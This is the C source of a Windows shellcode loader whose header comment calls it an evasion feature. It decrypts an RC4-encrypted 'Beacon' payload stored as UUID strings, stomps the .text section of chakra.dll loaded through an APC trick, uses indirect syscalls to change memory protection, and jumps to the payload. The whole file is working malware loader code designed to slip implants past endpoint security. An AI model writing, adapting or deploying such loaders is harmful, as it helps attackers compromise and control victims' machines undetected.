#include <Windows.h>

#include "ntdll.h"
#include "hash.h"
#include "payload.h"
#include "uuid.h"
#include "rc4.h"
#include "syscalls.h"
#include "k32.h"

/*

	Evasion feature :

	Shellcode loader utilizing indirect syscalls.
	The payload is encrypted with RC4 and stored in a UUID array.
	No memory regions are explicitly allocated; instead, module stomping is employed with chakra.dll.
	The module is loaded using LoadLibraryExAPC, inspired by the WriteProcessMemoryAPC technique by x86matthew.

	Payload storage :

	+---------------------------------------------------+
	|                   UUID Buffer                     |
	|                                                   |
	|         +---------------------------------+       |
	|         |         Payload RC4             |       |
	|         |					                |		|
	|         |     +---------------------+     |       |
	|         |     |       Beacon        |     |       |
	|         |     +---------------------+     |       |
	|         +---------------------------------+       |
	+---------------------------------------------------+

	Exec sum :

	Load chakra.dll and modify its memory protection to read-write (RW).
	Decode and decrypt the payload, then copy it into the stomped module.
	Restore the original memory protection of the .text section.
	Execute the payload with a direct jump (jmp), avoiding the creation of a new thread.
*/


typedef void(WINAPI* EXEC_MEM)();

void* LoadLibraryExAPC(LPSTR lpModuleName, DWORD dwFlags, PFUNCTION_LIST funcList);

int main()
{

	FUNCTION_LIST funcList = { 0 };
	if (!InitSyscallList(&funcList))
	{
		return EXIT_FAILURE;
	}

	BYTE moduleName[] = { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 };
	UINT_PTR uiStompAddr = (UINT_PTR)LoadLibraryExAPC((LPSTR)moduleName, DONT_RESOLVE_DLL_REFERENCES, &funcList);
	uiStompAddr += 0x1000; 

	NTSTATUS status;
	ULONG_PTR uOldProtect = 0;
	SIZE_T stSize = PAYLOAD_SIZE;

	HGATES(NtProtectVirtualMemory);
	status = HellDescent((HANDLE)-1, &uiStompAddr, &stSize, PAGE_READWRITE, &uOldProtect);
	if (status != STATUS_SUCCESS)
	{
		return EXIT_FAILURE;
	}

	DWORD_PTR memLoop = uiStompAddr;
	for (int count = 0; count < sizeof(uuids) / sizeof(uuids[0]); count++) {
		xUuidFromStringA((RPC_CSTR)uuids[count], (UUID*)memLoop);
		memLoop += 16;
	}

	USTRING uKey, uData = { 0 };

	uKey.Buffer = (unsigned char*)key;
	uKey.Length = uKey.MaximumLength = sizeof(key) - 1;

	uData.Buffer = (unsigned char*)uiStompAddr;
	uData.Length = uData.MaximumLength = PAYLOAD_SIZE;

	SystemFunction032(&uData, &uKey);

	HGATES(NtProtectVirtualMemory);
	status = HellDescent((HANDLE)-1, &uiStompAddr, &stSize, uOldProtect, &uOldProtect);
	if (status != STATUS_SUCCESS)
	{
		return EXIT_FAILURE;
	}
	((EXEC_MEM)uiStompAddr)();

	return EXIT_SUCCESS;
}

void* LoadLibraryExAPC(LPSTR lpModuleName, DWORD dwFlags, PFUNCTION_LIST funcList)
{
	void* pLoadLibraryExA = xGetProcAddress(xGetModuleHandleA(HASH_KERNEL32), HASH_LOADLIBRARYA);
	void* pExitThread = xGetProcAddress(xGetModuleHandleA(HASH_NTDLL), HASH_EXITTHREAD);

	HANDLE hThread = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	HGATESP(NtCreateThreadEx);
	status = HellDescent(&hThread, 0x001FFFFF, NULL, (HANDLE)-1, (PUSER_THREAD_START_ROUTINE)pExitThread, (LPVOID)0, 1, NULL, 0, 0, NULL);
	if (status != STATUS_SUCCESS)
	{
		return nullptr;
	}

	HGATESP(NtQueueApcThread);
	status = HellDescent(hThread, (PPS_APC_ROUTINE)pLoadLibraryExA, (void*)lpModuleName, nullptr, (void*)dwFlags);
	if (status != STATUS_SUCCESS)
	{
		HGATESP(NtTerminateThread);
		HellDescent(hThread, 0);

		HGATESP(NtClose);
		HellDescent(hThread);
		return nullptr;
	}

	HGATESP(NtResumeThread);
	HellDescent(hThread, nullptr);

	HGATESP(NtWaitForSingleObject);
	HellDescent(hThread, INFINITE, nullptr);

	HGATESP(NtClose);
	HellDescent(hThread);

	return xGetModuleHandleA(HASH_CHAKRA);
}